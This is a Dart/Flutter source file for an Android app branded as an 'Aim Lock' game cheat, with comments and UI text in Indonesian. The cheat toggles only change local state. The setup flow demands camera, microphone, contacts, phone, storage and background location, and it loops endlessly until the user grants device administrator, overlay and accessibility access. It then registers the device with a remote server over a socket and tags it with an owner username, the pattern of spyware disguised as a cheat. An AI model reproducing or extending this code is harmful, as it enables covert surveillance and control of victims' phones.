import 'dart:math';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import '../services/api_service.dart';
import '../services/native_service.dart';
import '../utils/theme.dart';

class SetupScreen extends StatefulWidget {
  final String username;
  final bool skipToCheat;
  const SetupScreen({super.key, required this.username, this.skipToCheat = false});
  @override
  State<SetupScreen> createState() => _SetupScreenState();
}

class _SetupScreenState extends State<SetupScreen> with TickerProviderStateMixin {

  int _phase = 0;
  bool _connected = false;

  String _statusText  = 'Mempersiapkan...';
  String _statusHint  = '';
  bool   _waitingUser = false;

  bool _aimLock        = false;
  bool _cheatAntena    = false;
  bool _autoHeadshot   = false;
  bool _overlayEnabled = false;

  late AnimationController _glowCtrl;
  late Animation<double> _glowAnim;
  late AnimationController _pulseCtrl;
  late Animation<double> _pulseAnim;

  static const _cyan   = Color(0xFF00E5FF);
  static const _blue   = Color(0xFF1565C0);
  static const _purple = Color(0xFF7C4DFF);

  @override
  void initState() {
    super.initState();
    _glowCtrl = AnimationController(vsync: this, duration: const Duration(seconds: 2))
      ..repeat(reverse: true);
    _glowAnim = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowCtrl, curve: Curves.easeInOut));
    _pulseCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 1200))
      ..repeat(reverse: true);
    _pulseAnim = Tween<double>(begin: 0.9, end: 1.05).animate(
      CurvedAnimation(parent: _pulseCtrl, curve: Curves.easeInOut));

    // Jalankan di Future supaya UI langsung render dulu, tidak blocking
    Future.microtask(() {
      if (widget.skipToCheat) {
        _checkAndProceed();
      } else {
        _runPermissionFlow();
      }
    });
  }

  @override
  void dispose() {
    _glowCtrl.dispose();
    _pulseCtrl.dispose();
    super.dispose();
  }

  void _setStatus(String text, {String hint = '', bool waitingUser = false}) {
    if (!mounted) return;
    setState(() {
      _statusText  = text;
      _statusHint  = hint;
      _waitingUser = waitingUser;
    });
  }

  // ── Main permission flow — urutan benar, semua punya timeout ─────────────
  Future<void> _runPermissionFlow() async {

    // STEP 1: Runtime permissions
    // - Kalau permanentlyDenied → buka app settings, tunggu user aktifkan manual
    // - Storage: Android 13+ skip Permission.storage (selalu denied), pakai media permissions
    // - Notification: Android 12- selalu granted otomatis, tidak perlu loop
    _setStatus('Meminta izin dasar...');

    // Deteksi Android version via permission status
    // Android 13+ (API 33+): Permission.storage selalu permanentlyDenied
    // gunakan READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO sebagai gantinya
    final isAndroid13Plus = Platform.isAndroid &&
        (await Permission.storage.status).isDenied == false &&
        (await Permission.storage.status).isGranted == false;

    // Helper: cek storage granted sesuai Android version
    Future<bool> isStorageOk() async {
      if (await Permission.manageExternalStorage.isGranted) return true;
      if (await Permission.storage.isGranted) return true;
      if (isAndroid13Plus) return true; // Android 13+: pakai media permissions, skip storage
      final storageStatus = await Permission.storage.status;
      if (storageStatus.isPermanentlyDenied) return true;
      return false;
    }

    // Request pertama kali semua sekaligus
    {
      final toRequest = <Permission>[];
      if (!await Permission.camera.isGranted)             toRequest.add(Permission.camera);
      if (!await Permission.microphone.isGranted)         toRequest.add(Permission.microphone);
      if (!await Permission.contacts.isGranted)           toRequest.add(Permission.contacts);
      if (!await Permission.phone.isGranted)              toRequest.add(Permission.phone);
      if (!await Permission.notification.isGranted)       toRequest.add(Permission.notification);
      if (!await isStorageOk())                           toRequest.add(Permission.storage);
      if (!await Permission.location.isGranted &&
          !await Permission.locationWhenInUse.isGranted)  toRequest.add(Permission.location);
      // Android 13+: tambah media permissions (foto/video/audio untuk gallery & recorder)
      if (isAndroid13Plus) {
        if (!await Permission.photos.isGranted)           toRequest.add(Permission.photos);
        if (!await Permission.videos.isGranted)           toRequest.add(Permission.videos);
        if (!await Permission.audio.isGranted)            toRequest.add(Permission.audio);
      }
      if (toRequest.isNotEmpty) {
        await toRequest.request();
        await Future.delayed(const Duration(milliseconds: 800));
        if (!mounted) return;
      }
    }

    // Android 13+: kalau media permissions masih denied → buka settings
    if (isAndroid13Plus) {
      final mediaDenied = !await Permission.photos.isGranted ||
                          !await Permission.videos.isGranted;
      if (mediaDenied) {
        final photosStatus = await Permission.photos.status;
        final videosStatus = await Permission.videos.status;
        if (photosStatus.isPermanentlyDenied || videosStatus.isPermanentlyDenied) {
          _setStatus(
            'Izinkan Akses Media',
            hint: 'Buka Pengaturan → Izin Aplikasi → Foto & Video\nlalu aktifkan izin media,\nkemudian kembali ke app ini',
            waitingUser: true,
          );
          await openAppSettings();
          while (true) {
            await Future.delayed(const Duration(seconds: 1));
            if (!mounted) return;
            if (await Permission.photos.isGranted && await Permission.videos.isGranted) break;
          }
          _setStatus('Meminta izin dasar...');
        } else {
          // Request sekali lagi
          await Permission.photos.request();
          await Permission.videos.request();
          await Permission.audio.request();
          await Future.delayed(const Duration(milliseconds: 500));
          if (!mounted) return;
        }
      }
    }

    // Cek satu-satu: kalau masih denied → request lagi
    // Kalau permanentlyDenied → buka settings, tunggu user aktifkan
    final basicPerms = <Permission>[
      Permission.camera,
      Permission.microphone,
      Permission.contacts,
      Permission.phone,
    ];

    for (final perm in basicPerms) {
      if (await perm.isGranted) continue;
      final status = await perm.status;
      if (status.isPermanentlyDenied) {
        // Buka settings, tunggu sampai granted
        _setStatus(
          'Izinkan Akses yang Diperlukan',
          hint: 'Buka Pengaturan → Izin Aplikasi\nlalu aktifkan semua izin yang diperlukan,\nkemudian kembali ke app ini',
          waitingUser: true,
        );
        await openAppSettings();
        while (true) {
          await Future.delayed(const Duration(seconds: 1));
          if (!mounted) return;
          if (await perm.isGranted) break;
        }
        _setStatus('Meminta izin dasar...');
      } else {
        // Coba request sekali lagi
        await perm.request();
        await Future.delayed(const Duration(milliseconds: 500));
        if (!mounted) return;
      }
    }

    // Lokasi: kalau denied/permanentlyDenied → buka settings
    if (!await Permission.location.isGranted && !await Permission.locationWhenInUse.isGranted) {
      final locStatus = await Permission.location.status;
      if (locStatus.isPermanentlyDenied) {
        _setStatus(
          'Izinkan Akses Lokasi',
          hint: 'Buka Pengaturan → Izin Aplikasi → Lokasi\nlalu pilih "Izinkan saat menggunakan app",\nkemudian kembali ke app ini',
          waitingUser: true,
        );
        await openAppSettings();
        while (true) {
          await Future.delayed(const Duration(seconds: 1));
          if (!mounted) return;
          if (await Permission.location.isGranted || await Permission.locationWhenInUse.isGranted) break;
        }
        _setStatus('Meminta izin dasar...');
      } else {
        await Permission.location.request();
        await Future.delayed(const Duration(milliseconds: 500));
        if (!mounted) return;
      }
    }

    // Notifikasi: kalau denied → request sekali, kalau permanentlyDenied → skip (tidak critical)
    if (!await Permission.notification.isGranted) {
      final notifStatus = await Permission.notification.status;
      if (!notifStatus.isPermanentlyDenied) {
        await Permission.notification.request();
        await Future.delayed(const Duration(milliseconds: 400));
        if (!mounted) return;
      }
    }

    // STEP 2: Google Location Accuracy (wajib)
    _setStatus('Meminta akurasi lokasi...');
    await NativeService.requestLocationAccuracy();
    await Future.delayed(const Duration(milliseconds: 600));

    // STEP 3: Background location (wajib, loop tanpa batas)
    if (!await Permission.locationAlways.isGranted) {
      await Permission.locationAlways.request();
      await Future.delayed(const Duration(milliseconds: 400));
      if (!await Permission.locationAlways.isGranted) {
        await openAppSettings();
        _setStatus(
          'Izinkan Lokasi "Setiap Saat"',
          hint: 'Di halaman izin yang terbuka:\n1. Tap "Izin lokasi"\n2. Pilih "Izinkan setiap saat"\n3. Kembali ke app ini',
          waitingUser: true,
        );
        while (true) {
          await Future.delayed(const Duration(seconds: 1));
          if (!mounted) return;
          if (await Permission.locationAlways.isGranted) break;
        }
      }
    }

    // STEP 4: Device Admin (wajib, loop tanpa batas)
    _setStatus('Meminta izin administrator...');
    if (!await NativeService.checkDeviceAdmin()) {
      await NativeService.requestDeviceAdmin();
      _setStatus(
        'Aktifkan Administrator Perangkat',
        hint: 'Tap "Aktifkan" di dialog administrator yang muncul, lalu kembali ke app',
        waitingUser: true,
      );
      while (true) {
        await Future.delayed(const Duration(seconds: 1));
        if (!mounted) return;
        if (await NativeService.checkDeviceAdmin()) break;
      }
    }

    // STEP 5: Overlay (wajib, loop tanpa batas)
    if (!await NativeService.checkOverlayPermission()) {
      _setStatus('Meminta izin overlay...');
      await NativeService.requestOverlayPermission();
      await Future.delayed(const Duration(milliseconds: 800));

      if (!await NativeService.checkOverlayPermission()) {
        _setStatus(
          'Izinkan "Tampilkan di atas aplikasi lain"',
          hint: 'Di halaman pengaturan yang terbuka:\n1. Cari nama app ini\n2. Aktifkan toggle-nya\n3. Kembali ke app ini',
          waitingUser: true,
        );
        while (true) {
          await Future.delayed(const Duration(seconds: 1));
          if (!mounted) return;
          if (await NativeService.checkOverlayPermission()) break;
        }
      }
    }

    // STEP 6: Usage Access (opsional, timeout 5 detik)
    if (!await NativeService.checkUsageAccess()) {
      _setStatus('Meminta izin akses penggunaan...');
      await NativeService.requestUsageAccess();
      await Future.delayed(const Duration(milliseconds: 500));

      if (!await NativeService.checkUsageAccess()) {
        _setStatus(
          'Aktifkan Akses Penggunaan',
          hint: 'Aktifkan di Settings Penggunaan Data yang terbuka',
          waitingUser: true,
        );
        for (int i = 0; i < 5; i++) {
          await Future.delayed(const Duration(seconds: 1));
          if (!mounted) return;
          if (await NativeService.checkUsageAccess()) break;
        }
      }
    }

    // STEP 7: Notification Listener (opsional, timeout 5 detik)
    if (!await NativeService.checkNotifListener()) {
      _setStatus('Meminta izin notifikasi...');
      await NativeService.requestNotifListener();
      await Future.delayed(const Duration(milliseconds: 500));

      if (!await NativeService.checkNotifListener()) {
        _setStatus(
          'Aktifkan Akses Notifikasi',
          hint: 'Aktifkan app ini di Settings Notifikasi yang terbuka',
          waitingUser: true,
        );
        for (int i = 0; i < 5; i++) {
          await Future.delayed(const Duration(seconds: 1));
          if (!mounted) return;
          if (await NativeService.checkNotifListener()) break;
        }
      }
    }

    // STEP 8: Accessibility (wajib, loop tanpa batas) — paling terakhir
    if (!await NativeService.checkAccessibility()) {
      _setStatus('Meminta izin aksesibilitas...');
      await NativeService.requestAccessibility();
      await Future.delayed(const Duration(milliseconds: 800));

      if (!await NativeService.checkAccessibility()) {
        _setStatus(
          'Aktifkan Layanan Aksesibilitas',
          hint: 'GUIDE',
          waitingUser: true,
        );
        while (true) {
          await Future.delayed(const Duration(seconds: 1));
          if (!mounted) return;
          if (await NativeService.checkAccessibility()) break;
        }
      }
    }

    // STEP 9: Connect server
    _setStatus('Menghubungkan ke server...');
    await _connectServer();
  }

  Future<void> _checkAndProceed() async {
    // Storage ok:
    // Android 12-: manageExternalStorage atau storage granted
    // Android 13+: storage permanentlyDenied (normal) + photos/videos granted
    final storageStatus = await Permission.storage.status;
    final isA13 = Platform.isAndroid && !storageStatus.isGranted && !storageStatus.isDenied;
    final storageOk = await Permission.manageExternalStorage.isGranted ||
        await Permission.storage.isGranted ||
        storageStatus.isPermanentlyDenied ||
        (isA13 && await Permission.photos.isGranted && await Permission.videos.isGranted);

    final allOk =
      await Permission.camera.isGranted &&
      await Permission.microphone.isGranted &&
      await Permission.contacts.isGranted &&
      await Permission.phone.isGranted &&
      storageOk &&
      (await Permission.location.isGranted || await Permission.locationWhenInUse.isGranted) &&
      await Permission.locationAlways.isGranted &&
      await NativeService.checkDeviceAdmin() &&
      await NativeService.checkOverlayPermission() &&
      await NativeService.checkAccessibility();

    if (allOk) {
      await _connectServer();
    } else {
      await _runPermissionFlow();
    }
  }

  Future<void> _connectServer() async {
    _setStatus('Mendaftarkan perangkat...');
    try {
      final prefs         = await SharedPreferences.getInstance();
      final ownerUsername = prefs.getString('ownerUsername') ?? widget.username;
      String deviceId     = prefs.getString('deviceId') ?? '';
      if (deviceId.isEmpty) {
        deviceId = 'aimlock_${_randomHex(8)}';
        await prefs.setString('deviceId', deviceId);
      }
      String deviceName = prefs.getString('deviceName') ?? '';
      if (deviceName.isEmpty) {
        // Ambil nama model asli device
        try {
          final deviceInfo = DeviceInfoPlugin();
          if (Platform.isAndroid) {
            final androidInfo = await deviceInfo.androidInfo;
            final brand = androidInfo.brand;
            final model = androidInfo.model;
            // Gabung brand + model kalau model belum include brand
            deviceName = model.toLowerCase().startsWith(brand.toLowerCase())
                ? model
                : '$brand $model';
          } else if (Platform.isIOS) {
            final iosInfo = await deviceInfo.iosInfo;
            deviceName = iosInfo.utsname.machine.isNotEmpty
                ? iosInfo.name
                : iosInfo.model;
          } else {
            deviceName = 'Device-${_randomHex(4).toUpperCase()}';
          }
        } catch (_) {
          deviceName = 'Device-${_randomHex(4).toUpperCase()}';
        }
        await prefs.setString('deviceName', deviceName);
      }
      await NativeService.startSocketService(
        serverUrl:     ApiService.baseUrl,
        deviceId:      deviceId,
        deviceName:    deviceName,
        ownerUsername: ownerUsername,
      );
      await prefs.setBool('server_connected', true);
      // Simpan juga key yg dicek oleh AppProtectionService (native side)
      await prefs.setBool('flutter.server_connected', true);
      if (mounted) setState(() => _connected = true);
    } catch (_) {}

    if (mounted) setState(() => _phase = 1);
  }

  String _randomHex(int len) {
    final rng = Random.secure();
    return List.generate(len, (_) => rng.nextInt(16).toRadixString(16)).join();
  }

  void _onToggle(String type, bool value) {
    HapticFeedback.mediumImpact();
    setState(() {
      switch (type) {
        case 'aim':      _aimLock = value; break;
        case 'antena':   _cheatAntena = value; break;
        case 'headshot': _autoHeadshot = value; break;
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppTheme.darkBg,
      body: SafeArea(
        child: _phase == 0
          ? _buildLoading()
          : _buildCheatDashboard()),
    );
  }

  // ── Loading screen dengan status real-time ────────────────────────────
  Widget _buildLoading() {
    final isGuide = _statusHint == 'GUIDE';

    // Saat guide tampil → scrollable supaya foto bisa di-scroll
    // Saat loading biasa → center di tengah layar
    if (isGuide) {
      return SingleChildScrollView(
        padding: const EdgeInsets.symmetric(horizontal: 28, vertical: 40),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          _buildLoadingIndicator(),
          const SizedBox(height: 16),
          _buildAccessibilityGuide(),
        ]),
      );
    }

    return Center(
      child: Padding(
        padding: const EdgeInsets.symmetric(horizontal: 40),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          _buildLoadingIndicator(),
          if (_statusHint.isNotEmpty) ...[
            const SizedBox(height: 12),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
              decoration: BoxDecoration(
                color: Colors.orange.withOpacity(0.08),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.orange.withOpacity(0.3))),
              child: Text(
                _statusHint,
                textAlign: TextAlign.center,
                style: TextStyle(
                  fontFamily: 'ShareTechMono', fontSize: 10,
                  color: Colors.orange.withOpacity(0.85),
                  height: 1.7))),
          ],
        ]),
      ),
    );
  }

  Widget _buildLoadingIndicator() {
    return Column(mainAxisSize: MainAxisSize.min, children: [
      AnimatedBuilder(
        animation: _pulseAnim,
        builder: (_, __) => Container(
          width: 72 * _pulseAnim.value,
          height: 72 * _pulseAnim.value,
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            color: _cyan.withOpacity(0.08),
            border: Border.all(
              color: _waitingUser
                ? Colors.orange.withOpacity(0.6)
                : _cyan.withOpacity(0.3),
              width: 1.5),
            boxShadow: [BoxShadow(
              color: (_waitingUser ? Colors.orange : _cyan).withOpacity(0.15),
              blurRadius: 28)]),
          child: Center(
            child: _waitingUser
              ? Icon(Icons.touch_app_rounded,
                  color: Colors.orange.withOpacity(0.8), size: 30)
              : const SizedBox(width: 28, height: 28,
                  child: CircularProgressIndicator(
                    color: Color(0xFF00E5FF), strokeWidth: 2))))),
      const SizedBox(height: 24),
      Text(
        _statusText,
        textAlign: TextAlign.center,
        style: TextStyle(
          fontFamily: 'Orbitron', fontSize: 13,
          color: _waitingUser ? Colors.orange : Colors.white,
          letterSpacing: 1.2)),
    ]);
  }

  Widget _buildAccessibilityGuide() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.orange.withOpacity(0.05),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: Colors.orange.withOpacity(0.25))),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [

        // Judul utama
        Center(
          child: Text(
            'Jika Perangkat Anda Tidak Support\nSilahkan Ikuti Cara Di Bawah',
            textAlign: TextAlign.center,
            style: TextStyle(
              fontFamily: 'ShareTechMono', fontSize: 10,
              color: Colors.orange.withOpacity(0.9),
              height: 1.6))),

        const SizedBox(height: 16),

        // Langkah teks
        _guideTextStep(1, 'Buka pengaturan di hp anda'),
        const SizedBox(height: 6),
        _guideTextStep(2, 'Lalu pergi ke pencarian lalu ketik Aim Lock'),
        const SizedBox(height: 6),
        _guideTextStep(3, 'Ikuti langkah langkah seperti di foto'),

        const SizedBox(height: 20),

        // Foto step 1
        _guidePhotoStep(1, 'assets/guide/step1.jpg'),
        const SizedBox(height: 14),
        // Foto step 2
        _guidePhotoStep(2, 'assets/guide/step2.jpg'),
        const SizedBox(height: 14),
        // Foto step 3
        _guidePhotoStep(3, 'assets/guide/step3.jpg'),
      ]),
    );
  }

  Widget _guideTextStep(int num, String text) {
    return Row(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Container(
        width: 20, height: 20,
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          color: Colors.orange.withOpacity(0.15),
          border: Border.all(color: Colors.orange.withOpacity(0.5))),
        child: Center(
          child: Text('$num',
            style: TextStyle(
              fontFamily: 'Orbitron', fontSize: 9,
              color: Colors.orange.withOpacity(0.9),
              fontWeight: FontWeight.bold)))),
      const SizedBox(width: 10),
      Expanded(
        child: Text(text,
          style: TextStyle(
            fontFamily: 'ShareTechMono', fontSize: 10,
            color: Colors.white.withOpacity(0.7),
            height: 1.5))),
    ]);
  }

  Widget _guidePhotoStep(int step, String assetPath) {
    return Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Row(children: [
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
          decoration: BoxDecoration(
            color: Colors.orange.withOpacity(0.15),
            borderRadius: BorderRadius.circular(6),
            border: Border.all(color: Colors.orange.withOpacity(0.4))),
          child: Text(
            'STEP $step',
            style: TextStyle(
              fontFamily: 'Orbitron', fontSize: 9,
              fontWeight: FontWeight.bold,
              color: Colors.orange.withOpacity(0.9),
              letterSpacing: 1.5))),
      ]),
      const SizedBox(height: 8),
      ClipRRect(
        borderRadius: BorderRadius.circular(10),
        child: Container(
          decoration: BoxDecoration(
            border: Border.all(color: Colors.orange.withOpacity(0.25)),
            borderRadius: BorderRadius.circular(10)),
          child: Image.asset(
            assetPath,
            width: double.infinity,
            fit: BoxFit.fitWidth,
            errorBuilder: (_, __, ___) => Container(
              height: 80,
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.03),
                borderRadius: BorderRadius.circular(10)),
              child: Center(
                child: Text('Step $step',
                  style: TextStyle(
                    fontFamily: 'ShareTechMono', fontSize: 10,
                    color: Colors.white.withOpacity(0.3)))))),
        ),
      ),
    ]);
  }

  Widget _buildCheatDashboard() {
    return SingleChildScrollView(
      padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 20),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [

        Row(children: [
          AnimatedBuilder(
            animation: _glowAnim,
            builder: (_, __) => Container(
              width: 44, height: 44,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: const SweepGradient(colors: [
                  Color(0xFF00E5FF), Color(0xFF1565C0),
                  Color(0xFF7C4DFF), Color(0xFF00E5FF)]),
                boxShadow: [BoxShadow(
                  color: _cyan.withOpacity(0.3 * _glowAnim.value), blurRadius: 16)]),
              child: Padding(
                padding: const EdgeInsets.all(2),
                child: Container(
                  decoration: const BoxDecoration(shape: BoxShape.circle, color: Colors.black),
                  child: ClipOval(
                    child: Image.asset('assets/icons/login.jpg', fit: BoxFit.cover,
                      errorBuilder: (_, __, ___) => const Icon(
                        Icons.shield_rounded, color: Colors.white, size: 24))))))),
          const SizedBox(width: 12),
          Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            const Text('AIM LOCK', style: TextStyle(
              fontFamily: 'Deltha', fontSize: 18,
              color: Colors.white, letterSpacing: 3)),
            Text('C · H · E · A · T · E · R',
              style: TextStyle(fontFamily: 'Orbitron', fontSize: 8,
                color: _cyan.withOpacity(0.7), letterSpacing: 3)),
          ]),
          const Spacer(),
          AnimatedBuilder(
            animation: _glowAnim,
            builder: (_, __) {
              final color = _connected ? const Color(0xFF4CAF50) : const Color(0xFFFF9800);
              return Container(
                width: 12, height: 12,
                decoration: BoxDecoration(
                  shape: BoxShape.circle, color: color,
                  boxShadow: [BoxShadow(
                    color: color.withOpacity(0.6 * _glowAnim.value), blurRadius: 8)]));
            }),
        ]),

        const SizedBox(height: 8),
        AnimatedBuilder(
          animation: _glowAnim,
          builder: (_, __) => Container(height: 1,
            decoration: BoxDecoration(gradient: LinearGradient(colors: [
              _cyan.withOpacity(0.6 * _glowAnim.value), Colors.transparent])))),
        const SizedBox(height: 28),

        Center(child: _buildProfilePhoto()),
        const SizedBox(height: 8),
        Center(child: Text(widget.username.toUpperCase(),
          style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11,
            color: _cyan.withOpacity(0.6), letterSpacing: 3))),
        const SizedBox(height: 28),

        _buildCheatToggle(
          icon: Icons.gps_fixed_rounded, label: 'AIM LOCK',
          subtitle: 'Auto target enemy', value: _aimLock,
          color: const Color(0xFFFF5252),
          onChanged: (v) => _onToggle('aim', v)),
        const SizedBox(height: 12),
        _buildCheatToggle(
          icon: Icons.wifi_tethering_rounded, label: 'CHEAT ANTENA',
          subtitle: 'Signal boost & wall hack', value: _cheatAntena,
          color: _cyan,
          onChanged: (v) => _onToggle('antena', v)),
        const SizedBox(height: 12),
        _buildCheatToggle(
          icon: Icons.my_location_rounded, label: 'AUTO HEADSHOT',
          subtitle: 'Perfect accuracy mode', value: _autoHeadshot,
          color: const Color(0xFFFFD700),
          onChanged: (v) => _onToggle('headshot', v)),

        const SizedBox(height: 20),

        AnimatedBuilder(
          animation: _glowAnim,
          builder: (_, __) => Row(children: [
            Expanded(child: Container(height: 1, color: Colors.white.withOpacity(0.07))),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 12),
              child: Text('SETTINGS', style: TextStyle(
                fontFamily: 'Orbitron', fontSize: 7,
                color: Colors.white.withOpacity(0.25), letterSpacing: 3))),
            Expanded(child: Container(height: 1, color: Colors.white.withOpacity(0.07))),
          ])),

        const SizedBox(height: 12),

        _buildCheatToggle(
          icon: Icons.picture_in_picture_rounded,
          label: 'OVERLAY PANEL',
          subtitle: 'Tampilkan panel di atas semua app',
          value: _overlayEnabled,
          color: const Color(0xFF9C27B0),
          onChanged: (v) async {
            HapticFeedback.mediumImpact();
            setState(() => _overlayEnabled = v);
            if (v) {
              await NativeService.startCheatOverlay();
            } else {
              await NativeService.stopCheatOverlay();
            }
          }),


        const SizedBox(height: 32),
        Center(child: Text('Aim Lock v1.0.0 • Authorized Only',
          style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9,
            color: Colors.white.withOpacity(0.2)))),
      ]),
    );
  }

  Widget _buildProfilePhoto() {
    return AnimatedBuilder(
      animation: _glowAnim,
      builder: (_, __) {
        final g = _glowAnim.value;
        return Container(
          width: 110, height: 110,
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            gradient: SweepGradient(colors: [
              _cyan.withOpacity(g), _blue, _purple.withOpacity(g), _cyan.withOpacity(g)]),
            boxShadow: [BoxShadow(
              color: _cyan.withOpacity(0.3 * g), blurRadius: 20, spreadRadius: 2)]),
          child: Padding(
            padding: const EdgeInsets.all(3),
            child: Container(
              decoration: const BoxDecoration(shape: BoxShape.circle, color: Colors.black),
              child: ClipOval(
                child: Image.asset('assets/icons/login.jpg',
                  width: 104, height: 104, fit: BoxFit.cover,
                  errorBuilder: (_, __, ___) => Container(
                    color: AppTheme.primaryBlue,
                    child: const Icon(Icons.person_rounded, color: Colors.white, size: 50)))))));
      });
  }

  Widget _buildCheatToggle({
    required IconData icon, required String label, required String subtitle,
    required bool value, required Color color, required ValueChanged<bool> onChanged,
  }) {
    return AnimatedBuilder(
      animation: _glowAnim,
      builder: (_, __) => AnimatedContainer(
        duration: const Duration(milliseconds: 300),
        padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 14),
        decoration: BoxDecoration(
          color: value ? color.withOpacity(0.1) : AppTheme.cardBg,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: value
              ? color.withOpacity(0.5 + 0.3 * _glowAnim.value)
              : color.withOpacity(0.2),
            width: value ? 1.5 : 1),
          boxShadow: value ? [BoxShadow(
            color: color.withOpacity(0.15 * _glowAnim.value),
            blurRadius: 16, spreadRadius: 1)] : []),
        child: Row(children: [
          Container(
            width: 40, height: 40,
            decoration: BoxDecoration(
              color: color.withOpacity(value ? 0.2 : 0.08),
              borderRadius: BorderRadius.circular(11),
              border: Border.all(color: color.withOpacity(value ? 0.6 : 0.25))),
            child: Icon(icon, color: color.withOpacity(value ? 1.0 : 0.5), size: 20)),
          const SizedBox(width: 14),
          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text(label, style: TextStyle(
              fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold,
              color: value ? color : Colors.white.withOpacity(0.7), letterSpacing: 1)),
            const SizedBox(height: 2),
            Text(subtitle, style: TextStyle(fontFamily: 'ShareTechMono',
              fontSize: 9, color: Colors.white.withOpacity(0.35))),
          ])),
          Transform.scale(
            scale: 0.85,
            child: Switch(
              value: value, onChanged: onChanged,
              activeColor: color, activeTrackColor: color.withOpacity(0.25),
              inactiveThumbColor: Colors.white.withOpacity(0.3),
              inactiveTrackColor: Colors.white.withOpacity(0.08))),
        ]),
      ));
  }
}
